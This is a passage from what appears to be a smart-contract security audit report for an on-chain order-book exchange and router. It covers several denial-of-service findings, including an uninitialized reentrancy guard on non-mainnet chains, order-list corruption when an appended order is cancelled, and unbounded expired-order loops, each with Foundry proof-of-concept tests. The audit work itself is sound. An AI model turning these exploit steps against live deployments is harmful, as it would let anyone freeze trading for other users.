On any supported L2, testnet, appchain, or non-mainnet deployment, permissionless users cannot execute routed swaps or launchpad buy/sell wrappers through GTERouter. Core router trading paths are functionally unavailable until a patched router is deployed.

## Proof of Concept
1. Deploy GTERouter on a chain or fork with block.chainid set to any value other than 1.
2. Call executeRoute with any calldata; the call does not reach _executeAllHops.
3. The inherited nonReentrant modifier reads the default zero guard slot and reverts with Reentrancy.
4. Repeat with launchpadBuy or launchpadSell and observe the same pre-body revert.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;

import "forge-std/Test.sol";
import {GTERouter} from "contracts/router/GTERouter.sol";

contract GTERouterTransientGuardPoC is Test {
    function test_executeRoute_revertsBeforeBody_onNonMainnet() external {
        vm.chainId(8453);

        GTERouter router = new GTERouter(
            payable(address(0x1001)),
            address(0x1002),
            address(0x1003),
            address(0x1004),
            address(0x1005),
            address(0x1006)
        );

        bytes[] memory hops = new bytes[](1);
        hops[0] = hex"01";

        vm.expectRevert();
        router.executeRoute(address(0xBEEF), 1 ether, 0, block.timestamp, hops);
    }
}

## Suggested Mitigation
Override the guard mode in GTERouter so Cancun deployments always use transient storage, for example: function _useTransientReentrancyGuardOnlyOnMainnet() internal view override returns (bool) { return false; }. Alternatively initialize the SSTORE sentinel before any guarded call on non-mainnet chains, but using transient storage consistently is simpler for the configured Cancun target.
```

### H-46 / `luMc8bQJZFJe5uuP0Lnl5`
- Finding title: Canceling an appended order corrupts the FIFO list and bricks matching at that price
- Report lines: 4508-4604
```md
## [H-46]. Canceling an appended order corrupts the FIFO list and bricks matching at that price

## id: luMc8bQJZFJe5uuP0Lnl5

## Derived From Pattern/Invariant
StandardViolation

## Exploit Type
StandardViolation

## Location
BookLib / CLOB.addOrderToBook / cancel / _matchIncomingBid

## Finding Status: Valid
### Finding Status Justification: The finding matches the code. BookLib stores the appended order before setting prevOrderId, so the storage record keeps prevOrderId == 0. CLOB.cancel removes the stored order through ds.removeOrderFromBook. With two orders at a price, cancelling the appended tail causes _updateLimitRemoveOrder to decrement numOrders and set headOrder and tailOrder to zero rather than preserving the older order. The tree entry remains. Subsequent matching at that price reads a null order and cannot progress. There is no nonReentrant or list-consistency safeguard relevant to this issue.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
When a second order is appended at an existing price level, BookLib stores the order before assigning its prevOrderId. The assignment mutates only the memory copy, so the stored tail order keeps prevOrderId == 0:

function _updateBookPostOrder(...) private returns (Limit storage limit) { ... self.orders[order.id] = order; }
function _updateLimitPostOrder(...) private { ... Order storage tailOrder = self.orders[limit.tailOrder]; tailOrder.nextOrderId = order.id; order.prevOrderId = tailOrder.id; limit.tailOrder = order.id; }

If the appended order is later canceled or otherwise removed, _updateLimitRemoveOrder treats it as the head because prevOrderId is zero, sets limit.headOrder to zero, and leaves the real older head order stranded in storage. The price level remains in the tree with numOrders > 0 but headOrder == 0, so matching loops at that price read a null maker order and revert/underflow instead of consuming liquidity.

## Impact
A permissionless maker can corrupt any shared price level by posting and canceling an appended order. Existing makers at that price lose access to cancellation/matching through the normal book path, takers cannot match through that top-of-book level, and the affected market can be functionally DoSed whenever the corrupted price is best bid/ask.

## Proof of Concept
1. Alice posts a sell limit order at price P.
2. Attacker posts another sell limit order at the same price P, becoming the tail, but its stored prevOrderId remains zero.
3. Attacker cancels their tail order.
4. Book removal treats the tail as the head and sets the limit head to zero while Alice's order remains stored and numOrders/tree metadata remain live.
5. A taker attempts to buy at P; matching reads order id zero at the best ask and cannot progress, so valid liquidity at P is bricked.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import {CLOBTestBase} from "test/clob/utils/CLOBTestBase.sol";
import {ICLOB} from "contracts/clob/ICLOB.sol";
import {Side} from "contracts/clob/types/Order.sol";

contract CLOBLinkedListCorruptionPoC is CLOBTestBase {
    function test_cancelTailWithZeroPrevCorruptsPriceLevel() public {
        _deployMarket();
        address alice = users[0];
        address attacker = users[1];
        address taker = users[2];

        _depositBase(alice, 100 ether);
        _depositBase(attacker, 100 ether);
        _depositQuote(taker, 100 ether);

        ICLOB.PostLimitOrderArgs memory ask = ICLOB.PostLimitOrderArgs({
            amountInBase: 10 ether,
            price: 1 ether,
            cancelTimestamp: 0,
            side: Side.SELL,
            clientOrderId: 0,
            limitOrderType: ICLOB.LimitOrderType.POST_ONLY
        });

        vm.prank(alice);
        uint256 aliceOrderId = clob.postLimitOrder(alice, ask).orderId;
        vm.prank(attacker);
        uint256 attackerOrderId = clob.postLimitOrder(attacker, ask).orderId;

        assertEq(clob.getOrder(attackerOrderId).prevOrderId.unwrap(), 0, "tail prev pointer not stored");

        uint256[] memory ids = new uint256[](1);
        ids[0] = attackerOrderId;
        vm.prank(attacker);
        clob.cancel(attacker, ICLOB.CancelArgs({orderIds: ids}));

        assertEq(clob.getLimit(1 ether, Side.SELL).headOrder.unwrap(), 0, "head was cleared");
        assertEq(clob.getOrder(aliceOrderId).owner, alice, "old head still stranded in storage");

        ICLOB.PostFillOrderArgs memory buy = ICLOB.PostFillOrderArgs({
            amount: 1 ether,
            priceLimit: 1 ether,
            side: Side.BUY,
            amountIsBase: true,
            fillOrderType: ICLOB.FillOrderType.IMMEDIATE_OR_CANCEL
        });
        vm.prank(taker);
        vm.expectRevert();
        clob.postFillOrder(taker, buy);
    }
}

## Suggested Mitigation
In _updateLimitPostOrder, set the predecessor on the storage order after appending, e.g. self.orders[order.id].prevOrderId = tailOrder.id, or assign prevOrderId before self.orders[order.id] = order. Add invariant tests for removing head, middle, and tail orders from multi-order limits.
```

### M-47 / `C4opETU5jlu8R9w5AyDv0`
- Finding title: GTERouter nonReentrant entrypoints revert on non-mainnet chains because the transient guard fallback slot is never initialized
- Report lines: 4605-4668
```md
## [M-47]. GTERouter nonReentrant entrypoints revert on non-mainnet chains because the transient guard fallback slot is never initialized

## id: C4opETU5jlu8R9w5AyDv0

## Derived From Pattern/Invariant
ConfigFootgun

## Exploit Type
Dos

## Location
GTERouter.executeRoute/launchpadBuy/launchpadSell

## Finding Status: Valid
### Finding Status Justification: GTERouter is in scope and inherits Solady ReentrancyGuardTransient without overriding _useTransientReentrancyGuardOnlyOnMainnet, which returns true. In the supplied guard, non-mainnet execution uses the storage fallback and reverts when sload(slot) is zero. GTERouter has no constructor or initializer write to that slot, so guarded functions such as executeRoute, launchpadBuy, and launchpadSell revert before their bodies on chain IDs other than 1. No code-level safeguard or documented acceptance of this behavior is present. The issue depends on current deployment chain, not future code.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
GTERouter inherits Solady `ReentrancyGuardTransient` without overriding `_useTransientReentrancyGuardOnlyOnMainnet()`. In Solady 0.0.287 this defaults to true. On `block.chainid != 1`, the guard uses the storage fallback branch and reverts when the guard slot is zero: `if eq(sload(s), address()) { revert(...) }`. GTERouter never initializes that slot, so every guarded entrypoint reverts before its function body executes on non-mainnet deployments. The affected functions are the core route entrypoint `executeRoute` and launchpad wrappers `launchpadBuy` / `launchpadSell`.

## Impact
On any supported L2, testnet, or non-mainnet deployment, the router's core trade route and launchpad buy/sell flows are functionally bricked for all users. Users may still interact with lower-level contracts directly, but the router integration is unavailable.

## Proof of Concept
1. Deploy GTERouter on a chain where block.chainid is not 1. 2. Call any nonReentrant router entrypoint, such as launchpadBuy or executeRoute. 3. The modifier checks the uninitialized storage guard slot, sees zero, and reverts with Reentrancy before executing the function body. 4. The same call would reach the function body on chainid 1, showing the failure is caused by the guard branch, not the route parameters.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {GTERouter} from "contracts/router/GTERouter.sol";

contract MockLaunchpadFallback {
    fallback() external payable {
        assembly {
            mstore(0x00, 1)
            mstore(0x20, 1)
            return(0x00, 0x40)
        }
    }
}

contract RouterTransientGuardDoSPoC is Test {
    function testNonMainnetGuardRevertsBeforeBody() external {
        vm.chainId(31337);
        GTERouter router = new GTERouter(payable(address(0x1)), address(new MockLaunchpadFallback()), address(0x2), address(0x3), address(0x4), address(0x5));

        vm.expectRevert(bytes4(0xab143c06)); // Reentrancy()
        router.launchpadBuy(address(0x10), 1, address(0x11), 1);

        vm.chainId(1);
        (uint256 baseBought, uint256 quoteSpent) = router.launchpadBuy(address(0x10), 1, address(0x11), 1);
        assertEq(baseBought, 1);
        assertEq(quoteSpent, 1);
    }
}

## Suggested Mitigation
Override `_useTransientReentrancyGuardOnlyOnMainnet()` in GTERouter to return false when deploying only to Cancun-compatible chains with EIP-1153, or initialize/use a standard storage reentrancy guard for non-mainnet deployments. Add deployment-chain tests for all guarded entrypoints.
```

### M-48 / `vWmsLvCofS-GL6ZvlABOI`
- Finding title: Same-price order cancellation corrupts CLOB price level and DoSes matching at the best bid or ask
- Report lines: 4669-4769
```md
## [M-48]. Same-price order cancellation corrupts CLOB price level and DoSes matching at the best bid or ask

## id: vWmsLvCofS-GL6ZvlABOI

## Derived From Pattern/Invariant
AccountingInvariantViolation: populated limit must have nonzero head/tail links and traversal count equal to numOrders

## Exploit Type
AccountingInvariantViolation

## Location
BookLib / CLOB._updateLimitPostOrder / cancel / postFillOrder

## Finding Status: Valid
### Finding Status Justification: The in-scope BookLib code violates the stated populated-limit invariant. For appended same-price orders, self.orders[order.id] is assigned before order.prevOrderId is set, so storage records a zero prev pointer. Removing that appended order decrements numOrders and assigns headOrder and tailOrder from zero prev/next links, leaving the price indexed with no valid head. Subsequent matching reads the null order and makes no progress. There is no full consistency check or automatic removal of the corrupted level, and the attack only requires ordinary public post and cancel actions.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
BookLib stores the appended order before setting its prevOrderId, so every second-or-later order at the same price is stored as if it were the head. Vulnerable snippet: `self.orders[order.id] = order;` happens in `_updateBookPostOrder`, then `_updateLimitPostOrder` later executes `tailOrder.nextOrderId = order.id; order.prevOrderId = tailOrder.id; limit.tailOrder = order.id;`. The memory write to `order.prevOrderId` is never persisted back to `self.orders[order.id]`. When the appended tail is cancelled, `_updateLimitRemoveOrder` sees prevOrderId == 0 and sets `limit.headOrder = next` and `limit.tailOrder = prev`; with no next order this leaves numOrders == 1 but headOrder == tailOrder == 0 while the price remains in the red-black tree. Matching then loads order 0 at the best price, gets baseDelta == 0, and breaks without clearing or advancing.

## Impact
A permissionless maker can cheaply corrupt the best ask or bid level. Crossing fills revert with ZeroCostTrade, and crossing GTC limits can post into a crossed book instead of matching. This causes market-side denial of service and hides resting orders at that price until their owners cancel by exact order id.

## Proof of Concept
1. Attacker posts two SELL limit orders at the same price.
2. The second order is appended but stored with prevOrderId == 0.
3. Attacker cancels the second order.
4. The limit still has numOrders == 1 and remains the best ask, but headOrder and tailOrder are zero.
5. A taker submits a crossing BUY fill order.
6. CLOB reads order 0, makes no progress, and reverts as ZeroCostTrade even though the price level is still populated.

## Proof of Code
pragma solidity 0.8.27;
import 'forge-std/Test.sol';
import {CLOB} from 'contracts/clob/CLOB.sol';
import {ICLOB} from 'contracts/clob/ICLOB.sol';
import {Side, OrderIdLib} from 'contracts/clob/types/Order.sol';
import {Limit, MarketConfig, MarketSettings} from 'contracts/clob/types/Book.sol';
import {IAccountManager} from 'contracts/account-manager/IAccountManager.sol';
import {FeeTiers} from 'contracts/clob/types/FeeData.sol';
import {BeaconProxy} from '@openzeppelin/proxy/beacon/BeaconProxy.sol';
import {UpgradeableBeacon} from '@openzeppelin/proxy/beacon/UpgradeableBeacon.sol';
contract MockAccountManager is IAccountManager {
    function getOperatorRoleApprovals(address, address) external pure returns (uint256) { return 0; }
    function getAccountBalance(address, address) external pure returns (uint256) { return type(uint256).max; }
    function getEventNonce() external pure returns (uint256) { return 0; }
    function getTotalFees(address) external pure returns (uint256) { return 0; }
    function getUnclaimedFees(address) external pure returns (uint256) { return 0; }
    function getFeeTier(address) external pure returns (FeeTiers) { return FeeTiers.ZERO; }
    function getSpotTakerFeeRateForTier(FeeTiers) external pure returns (uint256) { return 0; }
    function getSpotMakerFeeRateForTier(FeeTiers) external pure returns (uint256) { return 0; }
    function deposit(address, address, uint256) external {}
    function withdraw(address, address, uint256) external {}
    function depositFromRouter(address, address, uint256) external {}
    function withdrawToRouter(address, address, uint256) external {}
    function registerMarket(address) external {}
    function settleIncomingOrder(ICLOB.SettleParams calldata) external pure returns (uint256) { return 0; }
    function collectFees(address, address) external pure returns (uint256) { return 0; }
    function setSpotAccountFeeTier(address, FeeTiers) external {}
    function setSpotAccountFeeTiers(address[] calldata, FeeTiers[] calldata) external {}
    function creditAccount(address, address, uint256) external {}
    function creditAccountNoEvent(address, address, uint256) external {}
    function debitAccount(address, address, uint256) external {}
}
contract SamePriceCorruptionPOC is Test {
    CLOB clob;
    function setUp() public {
        MockAccountManager am = new MockAccountManager();
        CLOB impl = new CLOB(address(this), address(0x1234), address(am), 100);
        UpgradeableBeacon beacon = new UpgradeableBeacon(address(impl), address(this));
        MarketConfig memory cfg = MarketConfig({quoteToken: address(0xBEEF), baseToken: address(0xCAFE), quoteSize: 1, baseSize: 1});
        MarketSettings memory set = MarketSettings({status: true, maxLimitsPerTx: 10, minLimitOrderAmountInBase: 100, tickSize: 1, lotSizeInBase: 1});
        bytes memory data = abi.encodeWithSelector(CLOB.initialize.selector, cfg, set, address(this));
        clob = CLOB(address(new BeaconProxy(address(beacon), data)));
    }
    function testCancelingAppendedOrderCorruptsLimitAndBlocksFills() public {
        address maker = address(0xA11CE);
        address taker = address(0xB0B);
        vm.startPrank(maker);
        clob.postLimitOrder(maker, ICLOB.PostLimitOrderArgs({amountInBase: 100, price: 2, cancelTimestamp: 0, side: Side.SELL, clientOrderId: 0, limitOrderType: ICLOB.LimitOrderType.POST_ONLY}));
        ICLOB.PostLimitOrderResult memory second = clob.postLimitOrder(maker, ICLOB.PostLimitOrderArgs({amountInBase: 100, price: 2, cancelTimestamp: 0, side: Side.SELL, clientOrderId: 0, limitOrderType: ICLOB.LimitOrderType.POST_ONLY}));
        uint256[] memory ids = new uint256[](1);
        ids[0] = second.orderId;
        clob.cancel(maker, ICLOB.CancelArgs({orderIds: ids}));
        vm.stopPrank();
        Limit memory l = clob.getLimit(2, Side.SELL);
        assertEq(l.numOrders, 1);
        assertEq(OrderIdLib.unwrap(l.headOrder), 0);
        assertEq(OrderIdLib.unwrap(l.tailOrder), 0);
        vm.prank(taker);
        vm.expectRevert(CLOB.ZeroCostTrade.selector);
        clob.postFillOrder(taker, ICLOB.PostFillOrderArgs({amount: 100, priceLimit: 2, side: Side.BUY, amountIsBase: true, fillOrderType: ICLOB.FillOrderType.IMMEDIATE_OR_CANCEL}));
    }
}

## Suggested Mitigation
Persist the appended order prev pointer before or while storing it. For example, set `order.prevOrderId = limit.tailOrder` before `self.orders[order.id] = order`, or write `self.orders[order.id].prevOrderId = tailOrder.id` after updating the tail. Add invariant tests that every populated limit has nonzero head/tail and that cancelling any non-head order preserves traversal length.
```

### M-49 / `dknnew5I8_c7ttT34fiMV`
- Finding title: Expired order queues can force unbounded matching and settlement work, DoSing CLOB fills
- Report lines: 4770-4853
```md
## [M-49]. Expired order queues can force unbounded matching and settlement work, DoSing CLOB fills

## id: dknnew5I8_c7ttT34fiMV

## Derived From Pattern/Invariant
UnboundedLoops / CheapGriefingOrDosProfit

## Exploit Type
GasGriefBlockLimit

## Location
CLOB, AccountManager.postFillOrder/_matchIncomingBid/_matchIncomingAsk -> settleIncomingOrder

## Finding Status: Valid
### Finding Status Justification: The described path exists in scoped production code. CLOB._matchIncomingBid/_matchIncomingAsk remove expired best orders inside while loops that are bounded only by book state, not by a per-call cleanup limit. Expired removals add transient maker credits, and _settleIncomingOrder passes all makerCredits to AccountManager.settleIncomingOrder, which loops over the full array. maxLimitsPerTx limits placements per transaction and maxNumLimitsPerSide limits price levels, but neither caps same-price order count accumulated across transactions. There is no shown paginated public expiry cleanup or complete gas-bound safeguard. Permissionless users can place valid near-expiry orders and later any crossing order must process the expired prefix, so this is currently exploitable and in scope.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
CLOB matching has no bounded cleanup path for expired top-of-book orders, and AccountManager settlement then loops over every maker credit produced by that matching pass. Vulnerable snippets: `while (bestAskPrice <= incomingOrder.price && incomingOrder.amount > 0) { ... if (bestAskOrder.isExpired()) { _removeExpiredAsk(ds, bestAskOrder); bestAskPrice = ds.getBestAskPrice(); continue; } ... }` and `for (uint256 i; i < params.makerCredits.length; ++i) { MakerCredit memory credit = params.makerCredits[i]; ... _creditAccountNoEvent(...); }`. An attacker can accumulate many minimum-size orders at the same best price with near-term expiries across many transactions. Once expired, any marketable order crossing that side must clear the entire expired prefix in one transaction before reaching live liquidity. There is no pagination, cleanup limit, or keeper-only bounded remover, so if the expired prefix is larger than block gas, the cleanup and subsequent maker-credit settlement revert and the expired orders remain in place.

## Impact
Trading against the affected side of the market can be functionally blocked. Resting liquidity behind the expired queue becomes unreachable, taker fills revert or run out of gas, and the attacker only locks capital temporarily because expired orders are refunded when eventually cleared.

## Proof of Concept
1. Attacker posts many minimum-size ask orders at the best ask with a cancelTimestamp that is valid at submission but expires shortly after. The per-transaction limit only bounds each transaction, so the attacker repeats across many transactions and can use one price level to avoid max price-level limits. 2. After expiry, the best ask points to attacker expired orders. 3. A victim submits a buy fill or crossing buy limit. `_matchIncomingBid` must iterate through all expired asks and add maker refunds before any real match can occur. 4. The generated maker credit array is passed to `AccountManager.settleIncomingOrder`, which loops over every maker credit. 5. With enough expired orders or unique makers, gas exceeds the block limit, the transaction reverts, and all removals roll back, leaving the book blocked.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {AccountManager} from "contracts/account-manager/AccountManager.sol";
import {ICLOB} from "contracts/clob/ICLOB.sol";
import {Side} from "contracts/clob/types/Order.sol";
import {MakerCredit} from "contracts/clob/types/TransientMakerData.sol";

contract AccountManagerMakerCreditsGasDoSTest is Test {
    AccountManager internal accountManager;
    address internal base = address(0xB0);
    address internal quote = address(0xA0);
    address internal taker = address(0xCAFE);

    function setUp() public {
        uint16[] memory fees = new uint16[](3);
        accountManager = new AccountManager(address(0xBEEF), address(this), fees, fees);
        accountManager.registerMarket(address(this));
        accountManager.creditAccount(taker, quote, type(uint128).max);
    }

    function _settleWithMakers(uint256 n) internal returns (uint256 gasUsed) {
        MakerCredit[] memory credits = new MakerCredit[](n);
        for (uint256 i; i < n; ++i) {
            credits[i] = MakerCredit({maker: address(uint160(i + 1000)), quoteAmount: 1, baseAmount: 0});
        }

        ICLOB.SettleParams memory params = ICLOB.SettleParams({
            side: Side.BUY,
            taker: taker,
            takerBaseAmount: 0,
            takerQuoteAmount: 1,
            baseToken: base,
            quoteToken: quote,
            makerCredits: credits
        });

        uint256 g0 = gasleft();
        accountManager.settleIncomingOrder(params);
        gasUsed = g0 - gasleft();
    }

    function test_settlementGasScalesWithUnboundedMakerCredits() public {
        uint256 gas10 = _settleWithMakers(10);
        uint256 gas700 = _settleWithMakers(700);
        assertGt(gas700, gas10 * 20);
    }
}


## Suggested Mitigation
Add a bounded expired-order cleanup function with pagination and a maximum removals parameter, and make matching accept a caller-specified max cleanup/match count so progress can be split across transactions. Also cap `makerCredits.length` processed per settlement or split settlement into batches, and consider incentives for third parties who remove expired orders.
```

### M-50 / `zGQXAkrWqG1uci8hIrcI-`
- Finding title: DoS due to corrupted same-price order links in BookLib._updateLimitPostOrder
- Report lines: 4854-4900
```md
## [M-50]. DoS due to corrupted same-price order links in BookLib._updateLimitPostOrder

## id: zGQXAkrWqG1uci8hIrcI-

## Derived From Pattern/Invariant
AccountingInvariantViolation

## Exploit Type
Dos

## Location
BookLib._updateLimitPostOrder

## Finding Status: Valid
### Finding Status Justification: The root cause exists in the current in-scope BookLib implementation. The appended order is persisted before its previous link is set, leaving storage with prevOrderId equal to zero. When the appended tail is removed, the remove logic interprets it as the head and updates the limit pointers to zero without removing the price level because numOrders was not one at function entry. Later crossing orders read order id zero and cannot match the real stranded order. No invariant enforcement or repair blocks the exploit path, and it is reachable through public post and cancel calls.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
When appending to a non-empty price level, the new order is first stored in `_updateBookPostOrder` and only then has its in-memory `prevOrderId` set in `_updateLimitPostOrder`. The stored appended order therefore keeps `prevOrderId == 0`. Vulnerable snippet: `self.orders[order.id] = order;` followed later by `tailOrder.nextOrderId = order.id; order.prevOrderId = tailOrder.id; limit.tailOrder = order.id;`. If the appended tail is cancelled, `_updateLimitRemoveOrder` treats it as the head because `prev` is zero, setting both `headOrder` and `tailOrder` to zero while `limit.numOrders` remains non-zero and the price remains in the tree. Incoming crossing orders then read order id 0 at the best price, produce zero fill, and revert or stop matching while real liquidity is stranded behind the corrupted limit.

## Impact
A maker can cheaply brick matching at the best bid or ask for that price level. Users' crossing fill and marketable limit orders revert with ZeroCostTrade or fail to consume available liquidity until the stranded maker order is manually cancelled.

## Proof of Concept
1. Post two same-side limit orders at the same price. 2. Cancel the second order. 3. The limit still reports numOrders == 1 but headOrder == 0 and tailOrder == 0, while the first order still exists. 4. A crossing taker order sees the corrupted best price, loads the null order, obtains baseDelta == 0, and reverts instead of matching the first order.

## Proof of Code
pragma solidity 0.8.27;
import "forge-std/Test.sol";
import {BeaconProxy, IBeacon} from "@openzeppelin/proxy/beacon/BeaconProxy.sol";
import {CLOB, ICLOB, MarketConfig, MarketSettings} from "contracts/clob/CLOB.sol";
import {Side, OrderIdLib} from "contracts/clob/types/Order.sol";
import {Limit} from "contracts/clob/types/Book.sol";
import {IAccountManager} from "contracts/account-manager/IAccountManager.sol";
import {ICLOBManager, SettingsParams} from "contracts/clob/ICLOBManager.sol";
import {FeeTiers} from "contracts/clob/types/FeeData.sol";
contract Beacon is IBeacon { address public implementation; constructor(address impl){implementation=impl;} }
contract AM is IAccountManager { function getOperatorRoleApprovals(address,address) external pure returns(uint256){return type(uint256).max;} function getAccountBalance(address,address) external pure returns(uint256){return 0;} function getEventNonce() external pure returns(uint256){return 0;} function getTotalFees(address) external pure returns(uint256){return 0;} function getUnclaimedFees(address) external pure returns(uint256){return 0;} function getFeeTier(address) external pure returns(FeeTiers){return FeeTiers.ZERO;} function getSpotTakerFeeRateForTier(FeeTiers) external pure returns(uint256){return 0;} function getSpotMakerFeeRateForTier(FeeTiers) external pure returns(uint256){return 0;} function deposit(address,address,uint256) external {} function withdraw(address,address,uint256) external {} function depositFromRouter(address,address,uint256) external {} function withdrawToRouter(address,address,uint256) external {} function registerMarket(address) external {} function settleIncomingOrder(ICLOB.SettleParams calldata) external pure returns(uint256){return 0;} function collectFees(address,address) external pure returns(uint256){return 0;} function setSpotAccountFeeTier(address,FeeTiers) external {} function setSpotAccountFeeTiers(address[] calldata,FeeTiers[] calldata) external {} function creditAccount(address,address,uint256) external {} function creditAccountNoEvent(address,address,uint256) external {} function debitAccount(address,address,uint256) external {} }
contract FM is ICLOBManager { function beacon() external pure returns(address){return address(0);} function getMarketAddress(address,address) external pure returns(address){return address(0);} function isMarket(address) external pure returns(bool){return true;} function createMarket(address,address,SettingsParams calldata) external pure returns(address){return address(0);} function setMaxLimitsPerTx(ICLOB[] calldata,uint8[] calldata) external {} function setTickSizes(ICLOB[] calldata,uint256[] calldata) external {} function setMinLimitOrderAmounts(ICLOB[] calldata,uint256[] calldata) external {} function getMaxLimitExempt(address) external pure returns(bool){return false;} function setAccountFeeTiers(address[] calldata,FeeTiers[] calldata) external {} function setMaxLimitsExempt(address[] calldata,bool[] calldata) external {} }
contract CorruptSamePriceQueueTest is Test { using OrderIdLib for *; function testCancelingAppendedOrderCorruptsBestLimitAndBricksFill() external { AM am = new AM(); FM fm = new FM(); CLOB logic = new CLOB(address(fm), address(0xbeef), address(am), 100); bytes memory init = abi.encodeWithSelector(CLOB.initialize.selector, MarketConfig({quoteToken: address(0x1), baseToken: address(0x2), quoteSize: 1, baseSize: 1}), MarketSettings({status: true, maxLimitsPerTx: 10, minLimitOrderAmountInBase: 100, tickSize: 1, lotSizeInBase: 1}), address(this)); CLOB clob = CLOB(address(new BeaconProxy(address(new Beacon(address(logic))), init))); ICLOB.PostLimitOrderArgs memory ask = ICLOB.PostLimitOrderArgs({amountInBase: 100, price: 1, cancelTimestamp: 0, side: Side.SELL, clientOrderId: 0, limitOrderType: ICLOB.LimitOrderType.POST_ONLY}); clob.postLimitOrder(address(this), ask); clob.postLimitOrder(address(this), ask); uint256[] memory ids = new uint256[](1); ids[0] = 2; clob.cancel(address(this), ICLOB.CancelArgs({orderIds: ids})); Limit memory l = clob.getLimit(1, Side.SELL); assertEq(l.numOrders, 1); assertEq(l.headOrder.unwrap(), 0); assertEq(l.tailOrder.unwrap(), 0); assertEq(clob.getOrder(1).owner, address(this)); ICLOB.PostFillOrderArgs memory buy = ICLOB.PostFillOrderArgs({amount: 100, priceLimit: type(uint256).max, side: Side.BUY, amountIsBase: true, fillOrderType: ICLOB.FillOrderType.IMMEDIATE_OR_CANCEL}); vm.expectRevert(CLOB.ZeroCostTrade.selector); clob.postFillOrder(address(0xCAFE), buy); } }

## Suggested Mitigation
Persist the appended order's previous pointer before or immediately after storing it. For example, set `order.prevOrderId = limit.tailOrder` before `self.orders[order.id] = order`, or after assigning `order.prevOrderId`, write it back with `self.orders[order.id].prevOrderId = tailOrder.id`. Add invariant tests for `head.prev == 0`, `tail.next == 0`, and traversal count matching `numOrders` after cancel/amend/remove.
```

### M-51 / `AvI34sCVIJRryIjqtw_cN`
- Finding title: Cancelling an appended same-price order corrupts CLOB price queues and DoSes matching at the best price
- Report lines: 4901-5017
```md
## [M-51]. Cancelling an appended same-price order corrupts CLOB price queues and DoSes matching at the best price

## id: AvI34sCVIJRryIjqtw_cN

## Derived From Pattern/Invariant
CheapGriefingOrDosProfit

## Exploit Type
Dos

## Location
CLOB.cancel

## Finding Status: Valid
### Finding Status Justification: The described path exists in in-scope BookLib/CLOB code. addOrderToBook stores self.orders[order.id] before _updateLimitPostOrder sets order.prevOrderId in memory, so appended stored orders keep prevOrderId zero. Cancelling such a tail enters _updateLimitRemoveOrder with numOrders greater than one, decrements the count, and sets headOrder and tailOrder to zero while the first order and tree price remain. Matching then reads order id zero and makes no progress. There is no complete invariant check or repair guard, and any maker can create and cancel its own appended order.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
BookLib writes the new order to storage before setting its prevOrderId in the non-empty limit branch. The appended order is therefore stored with prevOrderId == 0 even though it is not the head:

function _updateBookPostOrder(Book storage self, Order memory order) private returns (Limit storage limit) {
    ...
    self.orders[order.id] = order;
}

function _updateLimitPostOrder(Book storage self, Limit storage limit, Order memory order) private {
    limit.numOrders++;
    if (limit.headOrder.isNull()) {
        limit.headOrder = order.id;
        limit.tailOrder = order.id;
    } else {
        Order storage tailOrder = self.orders[limit.tailOrder];
        tailOrder.nextOrderId = order.id;
        order.prevOrderId = tailOrder.id;
        limit.tailOrder = order.id;
    }
}

When the appended order is cancelled, _updateLimitRemoveOrder sees prevOrderId == 0 and nextOrderId == 0, treats it as both head and tail, decrements numOrders, and sets both limit.headOrder and limit.tailOrder to zero while the earlier order remains in self.orders and the price remains in the red-black tree. Matching then reads orders[0] at the best price, produces baseDelta == 0, breaks, and postFillOrder reverts with ZeroCostTrade. A permissionless maker can create this corrupted best ask or bid with two minimum-size orders and cancel only the second order, blocking all crossing taker fills at that price until the attacker cancels the remaining hidden order.

## Impact
A maker can cheaply freeze matching for the best bid or ask price level. Takers and router CLOB_FILL routes that should match real resting liquidity revert, causing market-level availability loss without requiring privileged access.

## Proof of Concept
1. Attacker deposits enough base token for two minimum-size ask orders.
2. Attacker posts two ask limit orders at the same best ask price.
3. The second order is appended, but its stored prevOrderId remains zero because BookLib mutates the memory copy after self.orders[order.id] was written.
4. Attacker cancels the second order.
5. The limit still has numOrders == 1 and the price remains in the ask tree, but headOrder and tailOrder are zero while the first order still exists.
6. Any taker submitting a crossing bid loads order zero, gets a zero match, and reverts with ZeroCostTrade despite live liquidity at the best ask.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {CLOBTestBase} from "test/clob/utils/CLOBTestBase.sol";
import {CLOB} from "contracts/clob/CLOB.sol";
import {ICLOB} from "contracts/clob/ICLOB.sol";
import {Side, OrderId} from "contracts/clob/types/Order.sol";
import {Limit} from "contracts/clob/types/Book.sol";

contract SamePriceCancelDoSPoC is CLOBTestBase {
    function test_tailCancelCorruptsBestAskAndBlocksFills() public {
        address maker = users[0];
        address taker = users[1];
        uint256 price = 1 ether;
        uint256 amount = 1 ether;

        setupTokens(Side.SELL, maker, amount * 2, price, true);

        ICLOB.PostLimitOrderArgs memory ask = ICLOB.PostLimitOrderArgs({
            amountInBase: amount,
            price: price,
            cancelTimestamp: NEVER,
            side: Side.SELL,
            clientOrderId: 0,
            limitOrderType: ICLOB.LimitOrderType.GOOD_TILL_CANCELLED
        });

        vm.startPrank(maker);
        uint256 firstId = clob.postLimitOrder(maker, ask).orderId;
        uint256 secondId = clob.postLimitOrder(maker, ask).orderId;

        uint256[] memory ids = new uint256[](1);
        ids[0] = secondId;
        clob.cancel(maker, ICLOB.CancelArgs({orderIds: ids}));
        vm.stopPrank();

        Limit memory corrupted = clob.getLimit(price, Side.SELL);
        assertEq(uint256(corrupted.numOrders), 1, "limit still claims one order");
        assertEq(OrderId.unwrap(corrupted.headOrder), 0, "head was zeroed");
        assertEq(OrderId.unwrap(corrupted.tailOrder), 0, "tail was zeroed");
        assertEq(clob.getOrder(firstId).owner, maker, "first order remains stored");

        setupTokens(Side.BUY, taker, amount, price, true);
        ICLOB.PostFillOrderArgs memory buy = ICLOB.PostFillOrderArgs({
            amount: amount,
            priceLimit: price,
            side: Side.BUY,
            amountIsBase: true,
